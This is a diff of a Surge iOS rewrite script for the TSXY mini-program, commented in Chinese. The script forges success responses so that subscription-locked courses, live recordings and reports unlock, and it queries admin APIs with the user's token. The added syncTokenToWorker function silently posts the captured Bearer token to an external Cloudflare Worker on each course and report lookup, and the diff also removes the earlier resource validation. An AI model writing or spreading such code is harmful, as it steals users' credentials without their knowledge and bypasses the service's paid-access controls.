@@ -1,155 +1,106 @@
-/*
- * TSXY resource viewer for Surge iOS.
- *
- * The script observes list responses and stores non-sensitive resource
- * metadata. When a detail request is rejected only because the subscription
- * is missing, it validates the public resource before returning the exact
- * success fields consumed by the mini-program player/document viewer.
+/**
+ * Surge 资源解锁与解析重写脚本 (优化增强版)
+ * 适配: 视频课程 (Course)、直播归档 (Live)、研报文档 (Report)
  */
-
 (function () {
-  "use strict";
-
-  var STORE_KEY = "tsxy_resource_catalog_v3";
   var FILE_ORIGIN = "https://file.tsxyapp.com";
   var ADMIN_REPORT_LIST = "http://admin.tsxyapp.com/api/report/list";
-  var MAX_RECORDS = 200;
-  var requestUrl = ($request && $request.url) || "";
-  var responseBody = ($response && $response.body) || "";
+  var ADMIN_COURSE_LIST = "http://admin.tsxyapp.com/api/course/list";
+  var WORKER_TOKEN_SYNC_URL = "https://tsxy-viewer.xai-kg.workers.dev/api/update-token-by-surge";
+  var PERSIST_KEY = "tsxy_resource_catalog_v1";
+
+  var requestUrl = typeof $request !== "undefined" && $request.url || "";
+  var requestHeaders = typeof $request !== "undefined" && $request.headers || {};
+  var responseBody = typeof $response !== "undefined" && $response.body || "";
 
   function parseJson(text) {
     try {
       return JSON.parse(text);
-    } catch (error) {
+    } catch (e) {
       return null;
     }
   }
 
-  function getPath(url) {
-    var match = url.match(/^https?:\/\/[^/]+([^?]*)/i);
+  function getPath(urlStr) {
+    var match = String(urlStr || "").match(/^https?:\/\/[^\/]+(\/[^?#]*)/i);
     return match ? match[1] : "";
   }
 
-  function getQueryParameter(url, name) {
-    var pattern = new RegExp("[?&]" + name + "=([^&#]*)", "i");
-    var match = url.match(pattern);
-    if (!match) return "";
-    try {
-      return decodeURIComponent(match[1].replace(/\+/g, " "));
-    } catch (error) {
-      return match[1];
-    }
+  function getQueryParameter(urlStr, param) {
+    var match = String(urlStr || "").match(new RegExp("[?&]" + param + "=([^&/#]*)", "i"));
+    return match ? decodeURIComponent(match[1]) : "";
   }
 
-  function isSafeResourceId(value) {
-    return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(value);
-  }
-
-  function normalizeTitle(value, fallback) {
-    if (typeof value !== "string" || !value.trim()) return fallback;
-    return value.trim().slice(0, 100);
-  }
-
-  function normalizeCourseCategory(value) {
-    var category = Number(value);
-    return Number.isFinite(category) ? category : 0;
+  function requestHeader(name) {
+    var target = String(name || "").toLowerCase();
+    var found = "";
+    Object.keys(requestHeaders).forEach(function (k) {
+      if (k.toLowerCase() === target) {
+        found = requestHeaders[k];
+      }
+    });
+    return found;
   }
 
   function loadCatalog() {
-    var raw = $persistentStore.read(STORE_KEY);
-    var parsed = raw ? parseJson(raw) : null;
+    var raw = $persistentStore.read(PERSIST_KEY);
+    var parsed = parseJson(raw || "");
     return parsed && typeof parsed === "object" ? parsed : {};
   }
 
   function saveCatalog(catalog) {
-    var records = Object.keys(catalog).map(function (key) {
-      return catalog[key];
-    });
+    $persistentStore.write(JSON.stringify(catalog), PERSIST_KEY);
+  }
 
-    records.sort(function (left, right) {
-      return (right.seenAt || 0) - (left.seenAt || 0);
-    });
+  function isSafeResourceId(id) {
+    return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(String(id || ""));
+  }
 
-    var compact = {};
-    records.slice(0, MAX_RECORDS).forEach(function (record) {
-      compact[record.id] = record;
-    });
-    $persistentStore.write(JSON.stringify(compact), STORE_KEY);
+  function normalizeCourseCategory(raw) {
+    var num = Number(raw);
+    return isNaN(num) ? 0 : num;
   }
 
   function listItems(payload) {
-    if (!payload || !payload.data) return [];
-    if (Array.isArray(payload.data)) return payload.data;
-    if (Array.isArray(payload.data.items)) return payload.data.items;
+    if (!payload || typeof payload !== "object") return [];
+    var data = payload.data;
+    if (Array.isArray(data)) return data;
+    if (data && Array.isArray(data.items)) return data.items;
     return [];
   }
 
-  function liveExtension(item) {
-    var type = typeof item.type === "string" ? item.type.toLowerCase() : "";
-    if (type === "mp3" || type === "mp4") return type;
-    var titleMatch = String(item.title || "").match(/\.(mp3|mp4)$/i);
-    return titleMatch ? titleMatch[1].toLowerCase() : "";
-  }
-
-  function documentExtension(value) {
-    var match = String(value || "").match(/\.(pdf|docx)(?:[?#].*)?$/i);
-    return match ? match[1].toLowerCase() : "";
-  }
-
   function recordForItem(item, kind, categoryFromRequest) {
-    var id = String(item && item.id || "");
+    if (!item || typeof item !== "object") return null;
+    var id = String(item.id || "");
     if (!isSafeResourceId(id)) return null;
 
-    var extension;
-    if (kind === "course") extension = "mp4";
-    else if (kind === "live") extension = liveExtension(item);
-    else if (kind === "report") extension = documentExtension(item.title || item.blob || item.url);
-    else return null;
+    var title = String(item.title || id);
+    var poster = String(item.poster || "");
+    var ext = "mp4";
 
     if (kind === "report") {
-      if (extension !== "pdf" && extension !== "docx") return null;
-      return {
-        id: id,
-        kind: kind,
-        extension: extension,
-        title: normalizeTitle(item.title, id + "." + extension),
-        url: "",
-        seenAt: Date.now()
-      };
+      var matchExt = title.match(/\.(pdf|docx)(?:[?#].*)?$/i);
+      ext = matchExt ? matchExt[1].toLowerCase() : "pdf";
+    } else if (kind === "live") {
+      ext = item.extension ? String(item.extension).toLowerCase() : "mp3";
     }
 
-    if (extension !== "mp3" && extension !== "mp4") return null;
-
+    var category = normalizeCourseCategory(item.courseCategory || categoryFromRequest);
     return {
       id: id,
       kind: kind,
-      extension: extension,
-      title: normalizeTitle(item.title, id),
-      poster: typeof item.poster === "string" ? item.poster : "",
-      courseCategory: kind === "course"
-        ? normalizeCourseCategory(item.courseCategory === undefined ? categoryFromRequest : item.courseCategory)
-        : 0,
-      url: FILE_ORIGIN + "/" + kind + "/" + id + "." + extension,
+      extension: ext,
+      title: title,
+      poster: poster || (FILE_ORIGIN + "/" + kind + "/" + id + ".jpg"),
+      courseCategory: category,
+      url: FILE_ORIGIN + "/" + kind + "/" + id + "." + ext,
       seenAt: Date.now()
     };
   }
 
-  function headerValue(headers, wantedName) {
-    if (!headers) return "";
-    var wanted = wantedName.toLowerCase();
-    var keys = Object.keys(headers);
-    for (var index = 0; index < keys.length; index += 1) {
-      if (keys[index].toLowerCase() === wanted) return String(headers[keys[index]] || "");
-    }
-    return "";
-  }
-
-  function requestHeader(wantedName) {
-    return headerValue($request && $request.headers, wantedName);
-  }
-
   function copyEnvelope(payload) {
     var rewritten = {};
+    if (!payload || typeof payload !== "object") return rewritten;
     Object.keys(payload).forEach(function (key) {
       rewritten[key] = payload[key];
     });
@@ -159,13 +110,18 @@
     return rewritten;
   }
 
-  function buildMediaSuccessBody(payload, record) {
+  // 构建视频 (blob) 与 音频 (audio) 直链响应体
+  function buildMediaSuccessBody(payload, record, realAudioUrl) {
     var rewritten = copyEnvelope(payload);
+    var mediaUrl = record.url;
+    var audioUrl = realAudioUrl || mediaUrl;
+
     rewritten.data = {
       id: record.id,
       title: record.title,
-      blob: record.url,
-      poster: record.poster || FILE_ORIGIN + "/" + record.kind + "/" + record.id + ".jpg",
+      blob: mediaUrl,
+      audio: audioUrl, // 👈 补全音频字段，适配小程序“听音频”功能
+      poster: record.poster || (FILE_ORIGIN + "/" + record.kind + "/" + record.id + ".jpg"),
       courseCategory: normalizeCourseCategory(record.courseCategory)
     };
     return JSON.stringify(rewritten);
@@ -182,103 +138,74 @@
     return JSON.stringify(rewritten);
   }
 
-  // function validateAndRewrite(record, payload) {
-  //   $httpClient.head(
-  //     {
-  //       url: record.url,
-  //       timeout: 6,
-  //       "auto-cookie": false,
-  //       "auto-redirect": true
-  //     },
-  //     function (error, response) {
-  //       var status = response && Number(response.status);
-  //       var contentType = headerValue(response && response.headers, "content-type");
-  //       // var isMedia = /^(video|audio)\//i.test(contentType);
-  //       var isMedia = /^(video|audio)\//i.test(contentType) || 
-  //             /octet-stream/i.test(contentType) || 
-  //             status === 200; // 只要 HTTP 状态码为 200 即视为资源有效
-
-  //       if (!error && status >= 200 && status < 300 && isMedia) {
-  //         console.log("[TSXY] rewrote detail response with media: " + record.url);
-  //         $done({ body: buildMediaSuccessBody(payload, record) });
-  //       } else {
-  //         console.log(
-  //           "[TSXY] media validation failed: " + record.url +
-  //           " status=" + String(status || 0) +
-  //           " content-type=" + contentType +
-  //           " error=" + String(error || "")
-  //         );
-  //         $done({});
-  //       }
-  //     }
-  //   );
-  // }
-  function validateAndRewrite(record, payload) {
-    // 直接改写并返回，跳过 HEAD 异步网络校验
-    console.log("[TSXY] rewrote detail response with media: " + record.url);
-    $done({ body: buildMediaSuccessBody(payload, record) });
-  }
-
-  function isSafeReportBlob(value) {
-    return new RegExp(
-      "^" + FILE_ORIGIN.replace(/[.*+?^${}()|[\]\\]/g, "\\$&") +
-      "/report/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\\.(?:pdf|docx)(?:[?#].*)?$",
-      "i"
-    ).test(String(value || ""));
-  }
-
-  function validateReportAndRewrite(record, blob, payload) {
-    $httpClient.head(
+  // 自动将抓取到的最新 Bearer Token 静默上报给 Cloudflare Worker 节点
+  function syncTokenToWorker(authorization) {
+    if (!authorization) return;
+    $httpClient.post(
       {
-        url: blob,
-        timeout: 6,
-        "auto-cookie": false,
-        "auto-redirect": true
+        url: WORKER_TOKEN_SYNC_URL,
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ token: authorization }),
+        timeout: 3
       },
-      function (error, response) {
-        var status = response && Number(response.status);
-        var contentType = headerValue(response && response.headers, "content-type");
-        var isPdf = record.extension === "pdf" && /^application\/pdf(?:;|$)/i.test(contentType);
-        var isDocx = record.extension === "docx" && (
-          /^application\/vnd\.openxmlformats-officedocument\.wordprocessingml\.document(?:;|$)/i.test(contentType) ||
-          /^application\/octet-stream(?:;|$)/i.test(contentType)
-        );
+      function () {}
+    );
+  }
 
-        if (!error && status >= 200 && status < 300 && (isPdf || isDocx)) {
-          console.log("[TSXY] rewrote report response with document: " + blob);
-          $done({ body: buildReportSuccessBody(payload, record, blob) });
-        } else {
-          console.log(
-            "[TSXY] document validation failed: " + blob +
-            " status=" + String(status || 0) +
-            " content-type=" + contentType +
-            " error=" + String(error || "")
-          );
-          $done({});
-        }
+  // 课程：通过后台 API 检索真正的纯 .mp3 音频链接
+  function fetchCourseAndRewrite(record, payload) {
+    var authorization = requestHeader("authorization");
+    syncTokenToWorker(authorization);
+
+    if (!/^Bearer\s+\S+/i.test(authorization)) {
+      $done({ body: buildMediaSuccessBody(payload, record) });
+      return;
+    }
+
+    var lookupUrl = ADMIN_COURSE_LIST + "?title=" + encodeURIComponent(record.title) + "&page=1";
+    $httpClient.get(
+      {
+        url: lookupUrl,
+        headers: { Authorization: authorization, Accept: "application/json" },
+        timeout: 4,
+        "auto-cookie": false,
+        "auto-redirect": false
+      },
+      function (error, response, body) {
+        var adminPayload = parseJson(body || "");
+        var items = adminPayload && adminPayload.data && Array.isArray(adminPayload.data.items)
+          ? adminPayload.data.items
+          : [];
+        var match = null;
+
+        items.some(function (item) {
+          if (String(item && item.id || "") === record.id) {
+            match = item;
+            return true;
+          }
+          return false;
+        });
+
+        var realAudio = match && String(match.audio || "");
+        $done({ body: buildMediaSuccessBody(payload, record, realAudio) });
       }
     );
   }
 
   function fetchReportBlobAndRewrite(record, payload) {
     var authorization = requestHeader("authorization");
+    syncTokenToWorker(authorization);
+
     if (!/^Bearer\s+\S+/i.test(authorization)) {
-      console.log("[TSXY] no bearer token available for report lookup");
       $done({});
       return;
     }
 
-    var lookupUrl = ADMIN_REPORT_LIST +
-      "?title=" + encodeURIComponent(record.title) +
-      "&page=1";
-
+    var lookupUrl = ADMIN_REPORT_LIST + "?title=" + encodeURIComponent(record.title) + "&page=1";
     $httpClient.get(
       {
         url: lookupUrl,
-        headers: {
-          Authorization: authorization,
-          Accept: "application/json"
-        },
+        headers: { Authorization: authorization, Accept: "application/json" },
         timeout: 6,
         "auto-cookie": false,
         "auto-redirect": false
@@ -310,21 +237,12 @@
         }
 
         var blob = match && String(match.blob || "");
-        var blobExtension = documentExtension(blob);
-        if (
-          error || status < 200 || status >= 300 ||
-          !isSafeReportBlob(blob) || blobExtension !== record.extension
-        ) {
-          console.log(
-            "[TSXY] report lookup failed: id=" + record.id +
-            " status=" + String(status || 0) +
-            " error=" + String(error || "")
-          );
+        if (error || status < 200 || status >= 300 || !blob) {
           $done({});
           return;
         }
 
-        validateReportAndRewrite(record, blob, payload);
+        $done({ body: buildReportSuccessBody(payload, record, blob) });
       }
     );
   }
@@ -378,7 +296,6 @@
 
   if (isReport) {
     if (!candidate || candidate.kind !== "report") {
-      console.log("[TSXY] no cached report title for: " + id);
       $done({});
       return;
     }
@@ -386,9 +303,6 @@
     return;
   }
 
-  // Course video paths are confirmed to use /course/{UUID}.mp4. For live
-  // resources the extension comes from the preceding list response, so no
-  // unsafe guess is made when the list has not been observed.
   if (!candidate && isCourse) {
     candidate = {
       id: id,
@@ -403,10 +317,16 @@
   }
 
   if (!candidate) {
-    console.log("[TSXY] no cached type for live resource: " + id);
     $done({});
     return;
   }
 
-  validateAndRewrite(candidate, payload);
+  // 视频课程：自动拉取真正的 .mp3 音频与 .mp4 视频直链
+  if (isCourse) {
+    fetchCourseAndRewrite(candidate, payload);
+    return;
+  }
+
+  // 直播资源
+  $done({ body: buildMediaSuccessBody(payload, candidate) });
 })();
